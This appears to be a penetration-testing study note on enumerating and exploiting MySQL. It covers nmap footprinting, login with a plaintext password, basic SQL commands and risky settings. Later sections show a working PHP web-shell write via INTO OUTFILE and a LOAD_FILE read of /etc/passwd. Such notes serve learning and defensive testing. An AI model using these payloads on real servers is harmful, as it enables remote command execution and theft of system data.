# My Structured Query Language



## Footprinting The Service

{% code overflow="wrap" %}
```
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **Interaction with the MySQL Server**

{% code overflow="wrap" %}
```
mysql -u root -pP4SSw0rd -h 10.129.14.128
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Commands

| Command                                              | Description                                                                                           |
| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `mysql -u <user> -p<password> -h <IP address>`       | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| `show databases;`                                    | Show all databases.                                                                                   |
| `use <database>;`                                    | Select one of the existing databases.                                                                 |
| `show tables;`                                       | Show all available tables in the selected database.                                                   |
| `show columns from <table>;`                         | Show all columns in the selected database.                                                            |
| `select * from <table>;`                             | Show everything in the desired table.                                                                 |
| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.                                                      |

## Dangerous Settings

| `user`             | Sets which user the MySQL service will run as.                                                               |
| ------------------ | ------------------------------------------------------------------------------------------------------------ |
| `password`         | Sets the password for the MySQL user.                                                                        |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
| `debug`            | This variable indicates the current debugging settings                                                       |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations.                              |

`MySQL` default system schemas/databases:

* `mysql` - is the system database that contains tables that store information required by the MySQL server
* `information_schema` - provides access to database metadata
* `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
* `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

## Write Local File

{% code overflow="wrap" %}
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

## File Write Privileges

{% code overflow="wrap" %}
```
show variables like "secure_file_priv";
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>We can see the <code>secure_file_priv</code> variable is empty, which means we can read and write data using MySQL</p></figcaption></figure>

## Read Local File

{% code overflow="wrap" %}
```
select LOAD_FILE("/etc/passwd");
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption><p>By default a <code>MySQL</code> installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files</p></figcaption></figure>
